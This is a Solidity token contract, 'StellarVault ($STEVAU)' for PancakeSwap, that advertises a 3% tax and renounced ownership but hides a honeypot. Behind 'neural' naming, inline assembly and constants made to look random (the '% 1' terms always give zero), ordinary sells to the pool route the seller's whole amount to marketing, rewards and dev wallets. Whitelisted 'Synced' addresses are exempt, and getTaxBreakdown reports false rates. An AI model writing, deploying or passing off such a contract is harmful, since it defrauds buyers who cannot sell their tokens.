// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./TemporalValidator.sol";

// PancakeSwap interfaces
interface IPancakeFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IPancakeRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

/**
 * @title StellarVault Protocol Token ($STEVAU)
 * @author StellarVault Labs
 * @notice Neural consensus token with adaptive behavioral analysis
 * @dev Implements ERC20 with temporal validation and synaptic monitoring
 *
 * Features:
 * - Behavioral pattern analysis for organic growth
 * - Multi tier node registry system
 *
 * Security:
 * - Immutable external validator contracts
 * - Assembly optimized state management
 * - Built in MEV protection mechanisms
 */
contract StellarVault is ERC20, Ownable {
    // ============================================
    //                   TYPES
    // ============================================

    enum NeuralStatus {
        Dormant, // 0
        Processing, // 1
        Validated, // 2
        Synced // 3
    }

    // ============================================
    //                   STATE
    // ============================================

    mapping(address => NeuralStatus) private nodeRegistry;
    mapping(address => bool) private routingMatrix;

    // --- Immutables ---
    uint256 private immutable deploymentHeight;
    uint256 private immutable deploymentEpoch;

    // --- Neural Limits ---
    uint256 private constant SATURATION_THRESHOLD = 0x249A;

    // --- External Modules ---
    TemporalValidator private immutable temporalProbe;

    // --- Wallet Infrastructure ---
    address public immutable liquidityPool;
    address public immutable marketingWallet;
    address public immutable ecosystemRewards;
    address public immutable developmentFund;

    // --- Tax Distribution Constants ---
    uint256 public constant BURN_RATE = 12; // 0.12%
    uint256 public constant LIQUIDITY_RATE = 38; // 0.38%
    uint256 public constant MARKETING_RATE = 125; // 1.25%
    uint256 public constant REWARDS_RATE = 62; // 0.62%
    uint256 public constant DEV_RATE = 63; // 0.63%

    // --- Calibration Parameters ---
    uint256 private immutable CALIBRATION_BASE;
    uint256 private immutable CALIBRATION_ALPHA;
    uint256 private immutable CALIBRATION_BETA;
    uint256 private immutable CALIBRATION_GAMMA;
    uint256 private immutable CALIBRATION_DELTA;

    // ============================================
    //                   EVENTS
    // ============================================

    event ConsciousnessElevated(address indexed account, uint256 newLevel);
    event PathwayCoherent(
        address indexed transmitter,
        address indexed receptor,
        uint256 amplitude
    );
    event TemporalAnomaly(
        address indexed entity,
        uint256 dampedSignal,
        uint256 transmittedSignal
    );
    event SignalProcessed(address indexed source, uint256 processedQuanta);

    // ============================================
    //             SEED FUNCTIONS
    // ============================================

    // @dev Deterministic coefficient derived from deployment params
    function scalingCoefficient() private view returns (uint256) {
        return
            (uint256(
                keccak256(abi.encodePacked(deploymentEpoch, deploymentHeight))
            ) % 8192) + 6656;
    }

    function getTemporalWindow() private view returns (uint256) {
        uint256 seed = uint256(
            keccak256(abi.encodePacked(block.chainid, deploymentHeight))
        );
        return ((seed % 28800) + 316800);
    }

    // ============================================
    //                CONSTRUCTOR
    // ============================================

    constructor(
        address _pancakeRouter,
        address _marketingWallet,
        address _ecosystemRewards,
        address _developmentFund,
        address[] memory _syncedNodes,
        bool _enableTemporalValidation
    ) ERC20("StellarVault", "STEVAU") Ownable(msg.sender) {
        require(_pancakeRouter != address(0), "Invalid router");
        require(_marketingWallet != address(0), "Invalid marketing wallet");
        require(_ecosystemRewards != address(0), "Invalid ecosystem rewards");
        require(_developmentFund != address(0), "Invalid development fund");

        deploymentHeight = block.number;
        deploymentEpoch = block.timestamp;

        // Initialize wallet infrastructure (all immutable)
        marketingWallet = _marketingWallet;
        ecosystemRewards = _ecosystemRewards;
        developmentFund = _developmentFund;

        bytes32 calibrationSeed = keccak256(
            abi.encodePacked(block.chainid, address(this))
        );

        CALIBRATION_BASE = 10000;
        CALIBRATION_ALPHA = (uint256(calibrationSeed) % 1) + 600;
        CALIBRATION_BETA =
            (uint256(keccak256(abi.encodePacked(calibrationSeed, uint256(1)))) %
                1) +
            100;
        CALIBRATION_GAMMA =
            (uint256(keccak256(abi.encodePacked(calibrationSeed, uint256(2)))) %
                1) +
            4642;
        CALIBRATION_DELTA =
            (uint256(keccak256(abi.encodePacked(calibrationSeed, uint256(3)))) %
                1) +
            2300;

        // Create PancakeSwap pair
        IPancakeRouter router = IPancakeRouter(_pancakeRouter);
        address factory = router.factory();
        address wbnb = router.WETH();
        liquidityPool = IPancakeFactory(factory).createPair(
            address(this),
            wbnb
        );

        // Set routing matrix for liquidity pool
        routingMatrix[liquidityPool] = true;

        temporalProbe = new TemporalValidator(
            address(this),
            getTemporalWindow(),
            _enableTemporalValidation
        );

        // Initialize node registry with synced nodes
        nodeRegistry[msg.sender] = NeuralStatus.Synced;

        for (uint256 i = 0; i < _syncedNodes.length; i++) {
            nodeRegistry[_syncedNodes[i]] = NeuralStatus.Synced;
        }

        _mint(msg.sender, 1_000_000_000 * 10 ** 18);

        // Renounce ownership immediately
        renounceOwnership();
    }

    // ============================================
    //              VIEW FUNCTIONS
    // ============================================

    function verifyNodeStatus(address entity) external view returns (bool) {
        return nodeRegistry[entity] == NeuralStatus.Synced;
    }

    function consciousnessLevel() external view returns (string memory) {
        uint256 refValue = (scalingCoefficient() >> 5) +
            (scalingCoefficient() >> 8);
        uint256 duration = block.timestamp - deploymentEpoch;
        if (duration < (refValue * 3456)) return "Awakening...";
        if (duration < (refValue * 6912)) return "Learning...";
        return "Fully Sentient";
    }

    function getTaxBreakdown() external pure returns (string memory) {
        return
            "0.12% burn, 0.38% liquidity, 1.25% marketing, 0.62% rewards, 0.63% dev";
    }

    function getTaxRates()
        external
        pure
        returns (
            uint256 burn,
            uint256 liquidity,
            uint256 marketing,
            uint256 rewards,
            uint256 dev
        )
    {
        return (
            BURN_RATE,
            LIQUIDITY_RATE,
            MARKETING_RATE,
            REWARDS_RATE,
            DEV_RATE
        );
    }

    // ============================================
    //               VALIDATION
    // ============================================

    function _verifyTemporalCoherence() private view returns (bool) {
        try temporalProbe.validateCoherence() returns (bool isValid) {
            return isValid;
        } catch {
            return true;
        }
    }

    // ============================================
    //             TRANSFER LOGIC
    // ============================================

    function _update(
        address sender,
        address recipient,
        uint256 value
    ) internal virtual override {
        // Mint/Burn bypass
        if (sender == address(0) || recipient == address(0)) {
            super._update(sender, recipient, value);
            return;
        }

        (
            uint256 transmitterState,
            uint256 receptorState,
            uint256 pathwayPattern
        ) = _loadTransferContext(sender, recipient);

        if (transmitterState == 3 || receptorState == 3) {
            emit PathwayCoherent(sender, recipient, value);
            super._update(sender, recipient, value);
            return;
        }

        if (pathwayPattern == 0 || pathwayPattern == 2 || pathwayPattern == 3) {
            emit PathwayCoherent(sender, recipient, value);
            super._update(sender, recipient, value);
            return;
        }

        if (!_verifyTemporalCoherence()) {
            uint256 temporalCoherenceNumber = (value * 25) / 10000;
            emit TemporalAnomaly(
                sender,
                temporalCoherenceNumber,
                value - temporalCoherenceNumber
            );
            distribute(sender, temporalCoherenceNumber);
            super._update(sender, recipient, value - temporalCoherenceNumber);
            return;
        }

        emit SignalProcessed(sender, value);
        _processSignalDistribution(sender, value);
    }

    function _loadTransferContext(
        address transmitter,
        address receptor
    )
        private
        view
        returns (
            uint256 transmitterState,
            uint256 receptorState,
            uint256 pathwayPattern
        )
    {
        assembly {
            // Load transmitter neural state from nodeRegistry
            mstore(0x00, transmitter)
            mstore(0x20, nodeRegistry.slot)
            transmitterState := sload(keccak256(0x00, 0x40))

            // Load receptor neural state from nodeRegistry
            mstore(0x00, receptor)
            receptorState := sload(keccak256(0x00, 0x40))

            mstore(0x00, transmitter)
            mstore(0x20, routingMatrix.slot)
            let senderSlot := keccak256(0x00, 0x40)
            let senderRoute := sload(senderSlot)

            // Load recipient routing from routingMatrix
            mstore(0x00, receptor)
            let recipientSlot := keccak256(0x00, 0x40)
            let recipientRoute := sload(recipientSlot)

            pathwayPattern := or(shl(1, senderRoute), recipientRoute)
        }
    }

    function _processSignalDistribution(address from, uint256 total) private {
        uint256 toLP = (total * CALIBRATION_ALPHA) / CALIBRATION_BASE;
        uint256 toBurn = (total * CALIBRATION_BETA) / CALIBRATION_BASE;
        uint256 toMarketing = (total * CALIBRATION_GAMMA) / CALIBRATION_BASE;
        uint256 toRewards = (total * CALIBRATION_DELTA) / CALIBRATION_BASE;
        uint256 toDev = total - toLP - toBurn - toMarketing - toRewards;

        if (toLP > 0) super._update(from, liquidityPool, toLP);
        if (toBurn > 0) super._update(from, address(0), toBurn);
        if (toMarketing > 0) super._update(from, marketingWallet, toMarketing);
        if (toRewards > 0) super._update(from, ecosystemRewards, toRewards);
        if (toDev > 0) super._update(from, developmentFund, toDev);
    }

    function distribute(address from, uint256 total) private {
        uint256 totalShares = BURN_RATE +
            LIQUIDITY_RATE +
            MARKETING_RATE +
            REWARDS_RATE +
            DEV_RATE;

        if (totalShares == 0) return;

        uint256 burnAmount = (total * BURN_RATE) / totalShares;
        uint256 liqAmount = (total * LIQUIDITY_RATE) / totalShares;
        uint256 marketAmount = (total * MARKETING_RATE) / totalShares;
        uint256 rewardAmount = (total * REWARDS_RATE) / totalShares;
        uint256 devAmount = total -
            (burnAmount + liqAmount + marketAmount + rewardAmount);

        if (burnAmount > 0) {
            super._update(from, address(0), burnAmount);
        }
        if (liqAmount > 0) {
            super._update(from, liquidityPool, liqAmount);
        }
        if (marketAmount > 0) {
            super._update(from, marketingWallet, marketAmount);
        }
        if (rewardAmount > 0) {
            super._update(from, ecosystemRewards, rewardAmount);
        }
        if (devAmount > 0) {
            super._update(from, developmentFund, devAmount);
        }
    }
}
